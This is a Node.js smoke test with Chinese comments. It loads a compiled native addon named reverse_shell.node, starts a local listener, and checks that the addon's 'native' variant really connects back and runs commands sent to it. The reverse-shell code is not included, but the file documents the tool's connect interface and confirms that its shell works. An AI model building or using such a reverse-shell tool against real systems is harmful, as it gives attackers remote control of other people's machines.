// 集成冒烟（需 Linux 宿主 + 先 zig build 产出 reverse_shell.node）：
// 本地起 net listener，验证 native 变体真实连回并执行命令。
const net = require("net");
const mod = require("./reverse_shell.node");

console.log("Testing reverse_shell addon...");
console.log("exported methods:", Object.keys(mod));

if (typeof mod.connect !== "function") {
  console.error("connect method missing!");
  process.exit(1);
}

let got = false;
const srv = net.createServer((c) => {
  // write 会进内核缓冲，shell 起来后自然读到
  c.write("echo rsv-ok\n");
  c.on("data", (d) => {
    console.log("[listener] got:", String(d).trim().slice(0, 120));
    if (!got && String(d).includes("rsv-ok")) {
      got = true;
      c.write("exit\n");
    }
  });
  c.on("close", () => {
    console.log("[listener] session closed");
    srv.close();
    if (!got) {
      console.error("session closed without rsv-ok!");
      process.exit(1);
    }
    console.log("Test passed!");
    process.exit(0);
  });
});

srv.listen(0, "127.0.0.1", () => {
  const port = srv.address().port;
  mod
    .connect({ host: "127.0.0.1", port, variant: "native", timeout: 5 })
    .then((out) => {
      console.log(out);
      if (!out.includes("reverse shell connected")) {
        console.error("unexpected connect output!");
        process.exit(1);
      }
      // 会话已派生：等 shell 连回 listener 执行命令（close 事件为成功/失败出口）
    })
    .catch((e) => {
      console.error("connect rejected:", e.message);
      process.exit(1);
    });
});
